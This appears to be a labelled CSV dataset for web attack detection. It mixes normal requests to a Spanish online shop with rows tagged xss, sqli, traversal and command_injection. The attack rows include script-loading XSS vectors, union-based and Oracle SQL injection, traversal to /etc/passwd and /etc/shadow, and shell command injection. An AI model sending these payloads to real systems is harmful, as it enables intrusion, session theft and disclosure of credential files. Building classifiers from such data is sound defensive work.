payload,type
publico/autenticar.jsp?modo=entrar&login=zeisler&pwd=c%3Flept%F3mano&remember=on&B1=Entrar,normal
index.jsp,normal
"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script",xss
imagenes/logo.gif,normal
publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=76&B1=A%F1adir+al+carrito,normal
"""<SCRIPT a=`>` SRC=""""http://ha.ckers.org/xss.js""""></SCRIPT>""",xss
<input onfocus=write(XSS) autofocus>,xss
miembros/imagenes/ogono.jpg,normal
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
"<IMG SRC=x oncanplay=""alert(String.fromCharCode(88,83,83))"">",xss
Redirect 302 /a.jpg http://victimsite.com/admin.asp&;deleteuser,xss
?,sqli
..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE},traversal
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>",xss
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
miembros/salir.jsp,normal
"<body onMouseMove body onMouseMove=""javascript:javascript:alert(1)""></body onMouseMove>",xss
"<A HREF=""http://ha.ckers.org@google"">XSS</A>",xss
"<div style=""binding: url([link to code]);"">",xss
"<IMG DYNSRC=""javascript:alert('XSS');"">",xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=39&B1=A%F1adir+al+carrito,normal
imagenes/logo.gif,normal
imagenes/2.gif,normal
%c0%ae%c0%ae/{FILE},traversal
global/titulo.jsp,normal
"voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1",sqli
miembros/salir.jsp,normal
"<script src=""data:\xCB\x8F,javascript:alert(1)""></script>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
&ltscript&gtalert(document.cookie);</script>,xss
publico/carrito.jsp,normal
miembros/index.jsp,normal
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",xss
global/creditos.jsp,normal
"&lt;SCRIPT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\""&gt;&lt;/SCRIPT&gt;",xss
/../../../../../../../../bin/id|,traversal
miembros/salir.jsp,normal
perl -e &#39;print &#34;&#38;&#60;SCR&#92;0IPT&#62;alert&#40;&#34;XSS&#34;&#41;&#60;&#47;SCR&#92;0IPT&#62;&#34;&#59;&#39; &#62; out,xss
"<IMG SRC=""javascript:alert('XSS')""",xss
miembros/fotos.jsp,normal
imagenes/2.gif,normal
x' AND members.email IS NULL; --,sqli
;system('cat%20/etc/passwd'),command_injection
%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
%22;alert%28%27RVRSH3LL_XSS%29//,xss
miembros/salir.jsp,normal
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
"<a href=""javas\x06cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<a href=""javas\x0Dcript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
global/menum.jsp,normal
<input value=<><iframe/src=javascript:confirm(1),xss
"<script src=""data:\xE0\xA4\x98,javascript:alert(1)""></script>",xss
<%<!--'%><script>alert(1);</script -->,xss
..\..\..\{FILE},traversal
..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216{FILE},traversal
imagenes/cmenbul.gif,normal
\..\..\..\..\..\..\..\..\..\..\etc\passwd%00,traversal
publico/caracteristicas.jsp?id=1,normal
publico/caracteristicas.jsp?id=1,normal
publico/miembros.jsp,normal
miembros/index.jsp,normal
publico/caracteristicas.jsp?id=1,normal
...\...\{FILE},traversal
"exec sp_addsrvrolemember 'name' , 'sysadmin'",sqli
"<? foo=""><script>alert(1)</script>"">",xss
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1,sqli
%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE},traversal
imagenes/3.gif,normal
publico/productos.jsp,normal
publico/caracteristicas.jsp?id=2,normal
publico/autenticar.jsp?modo=entrar&login=monette&pwd=1ob20h9la3&remember=off&B1=Entrar,normal
imagenes/1.gif,normal
<body/onload=&lt;!--&gt;&#10alert(1)>,xss
.../.../.../{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"s{{s: select * from users where id=1 or ""{{"" or 1=1 -- 1",sqli
../{FILE},traversal
imagenes/logo.gif,normal
publico/productos.jsp,normal
miembros/editar.jsp?modo=registro&login=jeanhee&password=pl9t1r4&nombre=Ezequ%EDas&apellidos=Loyola&email=levi%40coivoco.gr&dni=69364169X&direccion=Carretera+Ribas+Matama+160%2C+&ciudad=Argelita&cp=29056&provincia=Cantabria&ntc=3120097383483394&B1=Registrar,normal
imagenes/logo.gif,normal
publico/miembros.jsp,normal
miembros/fotos.jsp,normal
publico/pagar.jsp?modo=insertar&precio=8328&B1=Pasar+por+caja,normal
miembros/salir.jsp,normal
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
miembros/imagenes/ogono.jpg,normal
"&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;",xss
global/estilos.css,normal
..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8..%uEFC8{FILE},traversal
global/creditos.jsp,normal
imagenes/1.gif,normal
"<IMG SRC=x ontoggle=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/1.gif,normal
"'`""><\x3Cscript>javascript:alert(1)</script>",xss
"s,(s: select * from users where id=1 or "",("" or 1=1 -- 1",sqli
%2e%2e%5c%2e%2e%5c{FILE},traversal
imagenes/logo.gif,normal
"<object onError object onError=""javascript:javascript:alert(1)""></object onError>",xss
%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,traversal
miembros/fotos.jsp,normal
%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE},traversal
.\..\.\..\.\..\{FILE},traversal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
global/menum.jsp,normal
publico/pagar.jsp?modo=insertar&precio=4658&B1=Pasar+por+caja,normal
"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",xss
"&lt;SCRIPT&gt;document&#46;write(\""&lt;SCRI\"");&lt;/SCRIPT&gt;PT SRC=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\""&gt;&lt;/SCRIPT&gt;",xss
imagenes/cmenbul.gif,normal
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE},traversal
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
../..//../..//../..//{FILE},traversal
bfilename,sqli
\..\..\..\..\WINDOWS\win.ini,traversal
"s.(s: select * from users where id=1 or "".("" or 1=1 -- 1",sqli
index.jsp,normal
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=86&B1=A%F1adir+al+carrito,normal
miembros/imagenes/ogono.jpg,normal
"&lt;LINK REL=\""stylesheet\"" HREF=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;css\""&gt;",xss
publico/carrito.jsp,normal
publico/carrito.jsp,normal
"'""`><script>/* *\x2Fjavascript:alert(1)// */</script>",xss
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
global/estilos.css,normal
"<img src=x onerror=\x12""javascript:alert(1)"">",xss
)-sleep(9999,sqli
imagenes/nuestratierra.jpg,normal
miembros/index.jsp,normal
"<img\x13src=x onerror=""javascript:alert(1)"">",xss
23 OR 1=1,sqli
"""<LINK REL=""""stylesheet"""" HREF=""""javascript:alert('XSS');"""">""",xss
publico/vaciar.jsp?B2=Vaciar+carrito,normal
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
index.jsp,normal
miembros/index.jsp,normal
imagenes/1.gif,normal
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE},traversal
global/menum.jsp,normal
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.vulnerable=true></object>,xss
miembros/imagenes/castro.jpg,normal
imagenes/nuestratierra.jpg,normal
miembros/salir.jsp,normal
"""<iframe src=""""vbscript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
publico/miembros.jsp,normal
&lt;SCRIPT&gt;alert('XSS');&lt;/SCRIPT&gt;,xss
<BODY ONLOAD=javascript:alert(1)>,xss
miembros/fotos.jsp,normal
publico/productos.jsp,normal
"s:.s: select * from users where id=1 or "":.""=1 or 1=1 -- 1",sqli
"alert(String.fromCharCode(88,83,83));'))"">",xss
miembros/editar.jsp?modo=registro&login=fergusso&password=inuNd%21Ar&nombre=Ubaldo&apellidos=Pellizza+Echevarr%EDa&email=operalo%40canovash.vg&dni=49159005R&direccion=Calle+Brasilia%2C+68%2C+&ciudad=Tard%E1guila&cp=09267&provincia=Teruel&ntc=2301580169203669&B1=Registrar,normal
imagenes/nuestratierra.jpg,normal
publico/carrito.jsp,normal
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
publico/registro.jsp?modo=registro&login=souren&password=P811S25&nombre=Sisebuto&apellidos=Fincias+Alcoriza&email=diccico_pastor%40a%F1o09.io&dni=80914738W&direccion=C%2F+Altamira+179%2C+&ciudad=Almaluez&cp=45789&provincia=Sevilla&ntc=1714562160313645&B1=Registrar,normal
&#X03c;,xss
publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=10&B1=A%F1adir+al+carrito,normal
global/estilos.css,normal
global/creditos.jsp,normal
global/menum.jsp,normal
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
miembros/imagenes/castro.jpg,normal
&#60;IMG SRC&#61;&#34;livescript&#58;&#91;code&#93;&#34;&#62;,xss
"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",xss
..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE},traversal
global/creditos.jsp,normal
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
index.jsp,normal
"<;IMG "";"";"";>;<;SCRIPT>;alert("";XSS"";)<;/SCRIPT>;"";>;",xss
miembros/imagenes/zarauz.jpg,normal
global/estilos.css,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE},traversal
global/menum.jsp,normal
"';';;!--"";<;XSS>;=&;{()}",xss
limit,sqli
hi' or 'a'='a,sqli
"<xml src=""javascript:document.vulnerable=true;"">",xss
"/*iframe/src*/<iframe/src=""<iframe/src=@""/onload=prompt(1) /*iframe/src*/>",xss
miembros/imagenes/castro.jpg,normal
miembros/index.jsp,normal
"<IMG SRC=x onbeforeunload=""alert(String.fromCharCode(88,83,83))"">",xss
%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE},traversal
miembros/editar.jsp?modo=registro&login=chao-pin2&password=rabassa&nombre=Graciliano&apellidos=Ishida+Lasalle&email=dresdel.holmer%40xavipetit.um&dni=81568460H&direccion=Calle+Poador%2C+65+3A&ciudad=Fregeneda%2C+La&cp=47150&provincia=Valencia&ntc=3748443978921311&B1=Registrar,normal
publico/autenticar.jsp?modo=entrar&login=baudoin&pwd=destullecer&remember=on&B1=Entrar,normal
publico/registro.jsp?modo=registro&login=wittik&password=%21p3RAdeR9&nombre=Alma&apellidos=Blotta+Azagra&email=kashfi%40cropbay.jobs&dni=01237478D&direccion=Abubilla%2C+125+12H&ciudad=Arrazua-Ubarrundia&cp=10620&provincia=%C1vila&ntc=6204145249044457&B1=Registrar,normal
publico/caracteristicas.jsp?id=2,normal
publico/carrito.jsp,normal
"<a href=""\x07javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"<IMG SRC=x onload=""alert(String.fromCharCode(88,83,83))"">",xss
imagenes/3.gif,normal
"<script/src=data:,alert()>",xss
"<div style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",xss
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
publico/autenticar.jsp?modo=entrar&login=utilla&pwd=33s4h9929r&remember=off&B1=Entrar,normal
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""XSS\"");&lt;/SCRIPT&gt;",xss
"""><img src=x onerror=window.open('https://www.google.com/');>",xss
imagenes/3.gif,normal
miembros/imagenes/ogono.jpg,normal
"<meta HTTP-EQUIV=""Link"" Content=""<http://www.securitycompass.com/xss.css>; REL=stylesheet"">",xss
"<a href=""\x09javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
imagenes/logo.gif,normal
imagenes/cmenbul.gif,normal
</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>,xss
imagenes/nuestratierra.jpg,normal
imagenes/nuestratierra.jpg,normal
global/titulo.jsp,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
<script\x20>javascript:alert(1)</script>,xss
"<frameset onScroll frameset onScroll=""javascript:javascript:alert(1)""></frameset onScroll>",xss
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
%00../../../../../../etc/passwd,traversal
global/menum.jsp,normal
publico/autenticar.jsp?modo=entrar&login=keehn&pwd=abogada&remember=off&B1=Entrar,normal
miembros/imagenes/castro.jpg,normal
a' --,sqli
index.jsp,normal
imagenes/cmenbul.gif,normal
"s(1s: select * from users where id=1 or ""(1"" or 1=1 -- 1",sqli
publico/caracteristicas.jsp?id=1,normal
"UE(1): select * from users where id=1 union select (1),banner from v$version where rownum=1 -- 1",sqli
publico/vaciar.jsp?B2=Vaciar+carrito,normal
index.jsp,normal
..%255c..%255c..%255c..%255c{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",sqli
miembros/imagenes/zarauz.jpg,normal
"&lt;LINK REL=\""stylesheet\"" HREF=\""javascript&#058;alert('XSS');\""&gt;",xss
publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=47&B1=A%F1adir+al+carrito,normal
&#60;BGSOUND SRC&#61;&#34;javascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
imagenes/3.gif,normal
miembros/imagenes/castro.jpg,normal
publico/productos.jsp,normal
global/menum.jsp,normal
%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f%c0%2e%c0%2e%c0%2f{FILE},traversal
"<svg xmlns=""http://www.w3.org/2000/svg"">LOL<script>alert(123)</script></svg>",xss
miembros/imagenes/zarauz.jpg,normal
"<BR SIZE=""&{alert('XSS')}"">",xss
imagenes/cmenbul.gif,normal
"s:UEv: select * from users where id=1 or 1#"": union select null,version() -- 1",sqli
publico/carrito.jsp,normal
publico/vaciar.jsp?B2=Vaciar+carrito,normal
miembros/editar.jsp?modo=registro&login=zlotnick&password=aGoBiAr&nombre=Isabel&apellidos=Yescas+Feal&email=broughton0%40naturalchild.lc&dni=33437614F&direccion=C%2F+Academia%2C+59%2C+3%3FG&ciudad=Benidoleig&cp=21890&provincia=Navarra&ntc=8971303615649056&B1=Registrar,normal
publico/pagar.jsp?modo=insertar&precio=5596&B1=Confirmar,normal
imagenes/3.gif,normal
publico/productos.jsp,normal
"<body onBeforeUnload body onBeforeUnload=""javascript:javascript:alert(1)""></body onBeforeUnload>",xss
miembros/salir.jsp,normal
index.jsp,normal
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",xss
imagenes/1.gif,normal
\nid;,command_injection
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(1)""&#11;&#10;&#09;;>",xss
global/creditos.jsp,normal
global/creditos.jsp,normal
publico/productos.jsp,normal
imagenes/3.gif,normal
miembros/salir.jsp,normal
imagenes/1.gif,normal
miembros/imagenes/castro.jpg,normal
"<table background=""javascript:javascript:alert(1)"">",xss
global/titulo.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/productos.jsp,normal
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>,xss
imagenes/3.gif,normal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
miembros/imagenes/ogono.jpg,normal
"<A HREF=""http://google:ha.ckers.org"">XSS</A>",xss
global/titulo.jsp,normal
"<a href=""\xE2\x80\x80javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
"o..UE: select * from users where id=1<@.. union select 1,version() -- 1",sqli
"<IMG SRC=""http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"">",xss
"""ascript:alert('XSS');"""">""",xss
global/titulo.jsp,normal
..%u2215..%u2215..%u2215..%u2215..%u2215{FILE},traversal
"<a href=""javas\x04cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
miembros/index.jsp,normal
miembros/imagenes/castro.jpg,normal
publico/autenticar.jsp?modo=entrar&login=gidget&pwd=p5r0i9i5ar&remember=on&B1=Entrar,normal
"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",xss
<script <B>document.vulnerable=true;</script>,xss
%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE},traversal
global/estilos.css,normal
publico/registro.jsp?modo=registro&login=penningt&password=BRUscatE&nombre=Teresilda&apellidos=Claverol+Lemunao&email=cadenat.mulich%404ghz.do&dni=69634281X&direccion=Alonso+De+Mendoza%2C+31+3B&ciudad=Villares+de+Soria%2C+Los&cp=44310&provincia=Girona&ntc=1657191621298298&B1=Registrar,normal
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');",xss
global/creditos.jsp,normal
publico/caracteristicas.jsp?id=1,normal
publico/pagar.jsp?modo=insertar&precio=4857&B1=Pasar+por+caja,normal
' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i,sqli
"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",xss
imagenes/3.gif,normal
"""<img src=""""livescript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
"""<link rel=""""stylesheet"""" href=""""javascript:document.write(""""XSS-XSS-XSS"""");"""">""",xss
imagenes/logo.gif,normal
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\{FILE},traversal
publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
"<IMG SRC=\""jav&#x0D;ascript:alert('XSS');\"">",xss
imagenes/logo.gif,normal
global/menum.jsp,normal
"sUE&o: select * from users where id='1' union select ||/1,version() -- 1'",sqli
"snUEv: select * from users where id=1 or 1#""$ union select null,version() -- 1",sqli
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
&LT,xss
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,xss
exec sp,sqli
imagenes/cmenbul.gif,normal
"<iframe src iframe src=""javascript:javascript:alert(1)""></iframe src>",xss
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE},traversal
"<;STYLE type="";text/css"";>;BODY{background:url("";javascript:alert(';XSS';)"";)}<;/STYLE>;",xss
"&lt;XML ID=\""xss\""&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\""javas&lt;!-- --&gt;cript&#58;alert('XSS')\""&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;",xss
miembros/fotos.jsp,normal
imagenes/1.gif,normal
global/titulo.jsp,normal
\..\..\..\..\..\..\..\..\..\..\etc\shadow,traversal
miembros/imagenes/ogono.jpg,normal
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
miembros/editar.jsp?modo=registro&login=whinnery&password=encabar&nombre=Sabiela&apellidos=Royo+Mascarell&email=cane%40meneamex.br&dni=60106679C&direccion=Calle+Biznaga%2C+5+&ciudad=Velilla+de+Cinca&cp=15124&provincia=Santa+Cruz+de+Tenerife&ntc=6795968081758370&B1=Registrar,normal
"<body onload body onload=""javascript:javascript:alert(1)""></body onload>",xss
global/menum.jsp,normal
miembros/imagenes/castro.jpg,normal
imagenes/1.gif,normal
miembros/imagenes/castro.jpg,normal
' or uname like '%,sqli
imagenes/3.gif,normal
miembros/salir.jsp,normal
publico/pagar.jsp?modo=insertar&precio=5366&B1=Confirmar,normal
imagenes/3.gif,normal
"<TABLE BACKGROUND=""javascript:alert('XSS')"">",xss
"s?v: select * from users where id=1 or ""?@"" or 1=1 -- 1",sqli
..///..///..///..///..///..///..///{FILE},traversal
"<DIV STYLE=""background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"">",xss
miembros/imagenes/ogono.jpg,normal
imagenes/1.gif,normal
